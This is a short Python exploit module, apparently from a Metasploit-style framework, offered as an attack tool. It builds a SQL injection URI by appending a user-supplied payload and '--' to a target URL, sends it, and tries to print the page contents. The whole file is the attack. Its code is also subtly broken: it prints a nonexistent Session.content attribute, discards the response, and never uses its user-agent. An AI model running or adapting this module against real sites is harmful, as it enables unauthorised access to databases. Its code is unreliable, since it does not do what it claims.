"""
This website takes advantage of
websites that are vulnerable
to sql injection is generates
a payload URI to send.
"""

from core import logger
import requests
import os
import sys
from colorama import *



class Exploit:
	@staticmethod
	def show_info():
		logger.info("This website takes advantage of the\n sql injection you can put in the uri\n then print out the content\n")
		
	config = {
		"URI": "https://www.example.com",
    	"SqlCode": "Help"
    }

	def show_options(self):
		print(Fore.YELLOW+"Options"+Style.RESET_ALL)
		print(Fore.YELLOW+"-------"+Style.RESET_ALL)
		for key in sorted(self.config.keys()):
			print(Fore.YELLOW+key, ":", self.get_config(key)+Style.RESET_ALL)
	


	
	def set_config(self, key, value):
		if key in self.config.keys():
			self.config[key] = value
		else:
			logger.error("No options")
	
	
	def get_config(self, key):
		return self.config[key]

	def run(self):
		URI=self.config["URI"]
		Useragent=[]
		
		if os.name=='nt' or os.name=='posix':
			Useragent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
		else:
			sys.exit()
		
		payload=self.config["SqlCode"]
		
		uriPacket=URI+payload+"--"
		logger.info("[+]Crafted URI")
		
		Session=requests.session()
		Session.get(uriPacket)
		
		print(Session.content)
		
		Session.close()
